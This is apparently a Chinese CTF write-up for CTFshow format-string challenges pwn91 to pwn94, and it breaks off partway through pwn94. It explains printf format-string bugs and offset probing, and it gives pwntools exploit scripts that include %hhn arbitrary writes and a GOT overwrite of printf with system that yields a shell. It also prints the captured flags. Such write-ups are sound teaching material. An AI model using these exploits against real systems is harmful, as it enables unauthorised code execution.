---
title: CTFshow-Pwn入门格式化字符串(91-100)
url: https://mp.weixin.qq.com/s/ZYNKgcz-vU3avl8brKO19A
source: Doonsec's feed
date: 2026-03-18
fetch_date: 2026-03-19T04:16:07.243136
---

# CTFshow-Pwn入门格式化字符串(91-100)

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YdkQKXYKSBiaHZ5lOKPuqcwLC8e2mvweBDSO41x4UNtDWqcicMzQFXBE372nicJBibqn3SwKvkLJmLp77ZBBlROdnYp8LgV25ribicLZ8Gwme4gLA/0?wx_fmt=jpeg)

# CTFshow-Pwn入门格式化字符串(91-100)

原创

玫幽倩
玫幽倩

玫家大院

![]()

在小说阅读器中沉浸阅读

## pwn91

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBhao7yibLNKXuAk0xFwdkG5qibxZCibvOxJMfibQSfj1kMPnshFF4gM2Neibqql0FA74eOUONbV01FOIsS4wOX7nVRe9KWGAN1B54WI/640?wx_fmt=png&from=appmsg)

保护：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBia8BFhPKuyGfxMNAcicFtgiaibMxiahaHyJckuNbzR78SFWq5molzvTtW1VEicrCbZ4hySDXxYwjLV61iaOXK1U6odc1WqrgYI9NsfAM/640?wx_fmt=png&from=appmsg)

是一个32位的，开了栈金丝雀，这意味着传统的简单栈溢出无用了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBia6us1b0y6qibYmFJicwcSabw7c1FoFI3num0QNhHYHL8jWZIPiaElpkoeZgFPlchgTf4bVz0kS5ia2BrdLtFj4R1lVa4aKia9bPzMM/640?wx_fmt=png&from=appmsg)

打开main函数，发现程序逻辑很简单，就是要我们让daniu变成6就好了

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBgQxJib34aBHg621rxUPmnIlAfHXSdZfD2nDKIuIyIXJiaCD9wrKCSmvWvBztnATmzyNI0G01y4cTUziaoEOKDkUofguAhTa6KTe4/640?wx_fmt=png&from=appmsg)

进入ctfshow()函数看看如何令daniu变成6

在这里我们就看见了格式化字符串的漏洞，楼哦对那个正在这两句话

```
  read(0, s, 0x50u);
  printf(s);
```

系统会输出用户可控输入s，这意味着我们可以在这个s里边放一些%x%p%s%n之类的格式化占位符，实现信息泄露或者任意地址写

正常来说，printf肯定是这样子用的

```
printf("%d", x);
printf("hello");
printf("%x %x", a, b);
```

也就是说，printf第一个参数是格式模板，之后才是要打印的数据

但这边是printf(s)

这意味着如果我输入多个%x这种格式符，printf会认为“噢这格式串里边有3个%x啊，那我要传3个整数参数才行”

但是代码里没有这仨参数啊

所以printf只能直接去栈上直接拿，但拿的是第几个呢？不知道

所以在实现这一个目标前，最重要的就是去确认我的输出到底在printf参数列表的第几个位置

我们可以在这里输入AAAA.%p%p%p%p%p%p%p%p。。。。。

观察第几个0x输出里边出现了41414141，即可说明我们的AAAA作为了第几个参数位被读到了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBiaRrIP8vYKa6X0iaMXyX0vWupwicpKSyWUcWsWicDww7YwpUvJYGygzE8zW6aUoDSX5vzx0KsrjycVW9ibCUf2b1pXHpC3WPGzGvTE/640?wx_fmt=png&from=appmsg)

数一下就能发现在第七个参数位置，我们可以用AAAA.%7$x来进行确认

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBhDw6kn4LU5ZXdFY5OiaQwfg2q7T6IbKRSWNaMGnTKsbpdvGQu91IXfXep2FLQm68pG75QAtg5qTRicN7kCL6O4tpYBWrdhZHBzQ/640?wx_fmt=png&from=appmsg)

发现确实是没问题

```
for i in range(1, 20):
    payload = f"AAAA%{i}$p"
    if "41414141" in send_payload(payload):
        print(f"Found offset at {i}")
        break
```

https://blog.csdn.net/weixin\_29322553/article/details/159134239

当然，如果懒得写那么多%x%p，我们也可以直接用脚本来嗅探出是第几个

知道偏移之后，我们就可以泄露任意地址了

只要我们知道某个地址，我们就可以直接把地址扔到输出里

```
%7$x：把第 7 个参数按整数打印
%7$s：把第 7 个参数当作“字符串地址”去读
%7$n：把第 7 个参数当作“写入目标地址”
```

比如我们想读一个整数地址附近的内容，我们就可以用p32(0x0804a02c) +b"AAAA%7$x"，内存大概如下：

```
[2c a0 04 08][41 41 41 41][25 37 24 78]
```

之后就会从这个地址读东西了

如果是$s，就会直接把这个地址作为指针，从这边开始一直读到\x00

但很明确我们这边不要读啊，我们要的是改daniu的数值

这边用到的就是%n了

它不会打印内容，而是直接把已输出的字符数写入参数指向的地址

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBiaeHlgssdBibda77XCoic7yTAVXvXLPy2Dnia0jl28vx6jppU0Bj3g7NCeTKD2clyu2RlZWLUl97UF7OaEkhWgC8VGSiaeIaIW0lMQ/640?wx_fmt=png&from=appmsg)

daniu地址很好定位

我们要写入一共是6个数，所以是payload = p32(0x0804b038) + b"%2c%7$hhn"

```
%n：将当前已输出的字符数写入到指定参数所指向的地址。默认情况下，写入的是一个 int类型的大小，通常是 4 字节（在 32 位系统中）。
%hn：将当前已输出的字符数写入，但只写入 2 字节（half word）。
%hhn：将当前已输出的字符数写入，但只写入 1 字节（half half word，即一个字节）
```

因为前边的p32（）这四个字节本身已经被printf输出计数计算了，所以我们再打印俩就是6了

当然也可以直接用pwntools帮我们完成payload = fmtstr\_payload(7,{daniu:6})

直接写脚本吧，倒也没有很难

```
from pwn import *
context(arch='i386',os='linux',log_level='debug')
io =  remote("pwn.challenge.ctf.show",28234)

daniu = 0x0804b038
payload = p32(daniu) + b"%2c%7$hhn"
io.sendline(payload)
io.interactive()
```

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBjtsKXmhkUcicMxfASRaR9LHYiasd1BicNQhrsgEGbB1Rkq3ibNlxgAjlDZWmRGp4YibL2W6hYfuNfLs2STB4XwlyQDXvgicfFMpIicBg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBgNhJRuxRGTJZUrNp1THujYmqv143lY0jBTf9ibrKtXF3bnnZDd11k209om6XkTkOfIaib8BkswJz7D4FpknG2uxRlvZ3q2sdBrE/640?wx_fmt=png&from=appmsg)

成功获取ctfshow{238e63c7-01d1-45e0-ab3c-5c32373f432d}

## pwn92

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBjribicq7UwibaVQ4cRoUeWefKjQr6bZTh9MOPlJa8ubnqfm252VMewb5JalsveuWnnH69jqHc9EHRwSKyGoicC8BWZToE9nMnqnlE/640?wx_fmt=png&from=appmsg)

原来还有更基础的吗

保护：

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBgZR0n8u8tAhM1Hl3YplfJ3hr5WniaTdicEfdAy2clKpeYVOls4ObDyTXEJ6lx6ibWYibmVce3Mia7Z0CmRdwntPY3FwNENc3tbsWcQ/640?wx_fmt=png&from=appmsg)

打开看看main函数，这边写了有例子

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBiawoGm3ibCVR6sgjrFugnz6WYRhQndgjk786lzLlpMdxYW308CwgULfbhGadh0ys7vC26dnibSibaPb4Q0NrCW02Gpq1Y95iazQKtQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBhT71ibaS90icV1H20NW3RwC5HeRpQpN6PP09bKprhdLLPTE2Cobic7Sk3jB2HCZP4ytSdTjiaXYfq4gvM4sicsPhv3fyqk117qDKyo/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBjsSaZWaNMJV53gYRm1XxWmyz7CaxQ9lvmpuB3Q8CIXaOdHuOotbWxLUpojr9ibEAZv3tbOnkX9mob8qicTWPnHHyzQbKwcBMmk0/640?wx_fmt=png&from=appmsg)

不亏是教学关，还有example

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBjpFMcmrxFkdNTaxOAdeNWL7zxG4yWzia6v9bGMzXjDXDnj2luQMbpLQ1TjBaiay8hf7Pcthiacribadt0gYmuNlDL1YGZFK8QDmCc/640?wx_fmt=png&from=appmsg)

看看获得flag的函数，这边会直接读出format，也就是我输入的字符串，我输入%s的话会直接让s被读出，也就是这个/ctfshow\_flag

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBgJr2lSAF9v0fQibtXgcRY9wLH1CD5uicibMxbG7EibJW9KgECy7S9MYSaMlibQgEN4YPib67TKW1Y9A1XPdqoMibVRLs5GFic9nEUZ8AI/640?wx_fmt=png&from=appmsg)

直接就读出来了

ctfshow{571dcb15-9bb0-462f-bd48-21e25d1b1648}

## pwn93

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBia4fqbrYWI2DyibELvvY4ibBm8n5916rFbB93G01wheaBSOLUOUibh3CB8fFdJ0rLgWfEJ3tMf6v3ZaQAqKfcibB5FuEOVMEDLktr4/640?wx_fmt=png&from=appmsg)

基础原理好啊

保护：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBgiczfcpSHW8RnqqRMxmTv6LxkpMib5RI6fBmIObOMmQp3giaIOytknJPAAicSu04C1TLxhQUhqhSMoGSRwVfibvMsuFAIBIrEzyJwo/640?wx_fmt=png&from=appmsg)

这些题确实是都只能用格式化字符串做

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBgSErf2NRdl4DVPofZYZI22UsjrXXSOmEPzIFVibU3zm3q6jx3caQbiasFoeKE8iaQ9ibXRiaibfZL5pot5M2T6dqRojmbOCnl7SxBibQ/640?wx_fmt=png&from=appmsg)

这菜单写挺好啊，程序崩溃、栈数据泄露、任意地址内存泄露、栈数据覆盖和任意地址内存覆盖，为我们都演示了一圈

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBhkWjgkJBgHKHqj3W81Xft3LNZjINqgDcR6sc2adYf5UVNpj3JBZtGibjyrTM7zjsicbyWfQlpicLmVZXCPy43oGoAySExpAFVLiaw/640?wx_fmt=png&from=appmsg)

而获取flag的值在case7

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBhzrOOsXibc87dcGJmtxScibyxNCewrKqZZF8VysdonuDQcJBiaW5WlhYCicGJkoVdiaAviamhAG8iakOsYMZqy5kzicEtzJ9hALQFUaVQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBjeTIKWJcte1hRrQu4FaaPIV3O7R9Zh8hqib3z4qb040fDSPUy8MPOicYibyZM4ian2bgibIjxWMlOz3mj7icrCgJjFnGfAUuPurOzLU/640?wx_fmt=png&from=appmsg)

同样是直接获取的，没什么好说的，只是一个演示题

ctfshow{72324a2f-4ea6-48cb-8deb-caa49943a709}

## pwn94

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBjhrhtIozHOOu3OdQkyAv0M8RibzAwIlIsNgg3ooGn1Irl3kfMDJNjR6NygujVGN6qnXib1r9tDKfZe9ickVUPYS1lRCV2JicroV38/640?wx_fmt=png&from=appmsg)

保护：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBiaYibd5dUib6GDzbyOh80OYUaSQ302kZXBSictPb9Fexvrv8fpY9dyJ6zYnAww1ubKhDssQsc4qRKAXHADicXDzMOrzGdSG78mHjEQ/640?wx_fmt=png&from=appmsg)

没怎么开保护啊，ida看看吧

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBiaGLbpDP6pSYVAg0sAdmqGeiaKrs2Xs14SSNjRGjuS0xwXtFHuIJ64hXmQC54l114kqmgCZu9K82AsFC2KAibLyEO1Iy6vF1xx5E/640?wx_fmt=png&from=appmsg)

可以看到这边直接就是在循环调用printf(buf)，buf还是我们可以输入的

先确认一下参数位置

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBjxtjTC62DE5tbdmtCRJ1bLwWBR4rG3sAIV3RqWQqD6WhdwhQMtYDPQgAhjQSxdaprvPZrRPeWr60rhNZwwvm4qaibKzF8KFrSQ/640?wx_fmt=png&from=appmsg)

第六个参数就是了AAAA.%6$x

![](https://mmbiz.qpic.cn/mmbiz_png/YdkQKXYKSBg9MXz4fFzicUyXicwHm3mCcyzjy8rs9DBHqtuOibAkeiaZ6Phe4Ap4MpajplWwM0Iqbvx1M4IPdvuiczVzFWYQrC2aJNj1fHtXuZFw/640?wx_fmt=png&from=appmsg)

那接下来我们只需要用fmtstr\_payload来将printf的got表改为system的plt即可，那么后续我们调用printf的时候其实调用的是system

再输入进参数，也就是/bin/sh即可得到shell

```
from pwn import *
context(arch='i386',os='linux',log_level='debug')
io = remote("pwn.challenge.ctf.show",28178)
elf = ELF('./pwn94')

system_plt = 0x8048400
printf_got = elf.got['printf']

payload = fmtstr_payload(6,{printf_got:system_plt})
io.sendline(payload)
io.recv()
io.sendline("/bin/sh\x00")

io.interactive()
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/YdkQKXYKSBiaYDLaPvwkDGfmF0hKyrFEa3...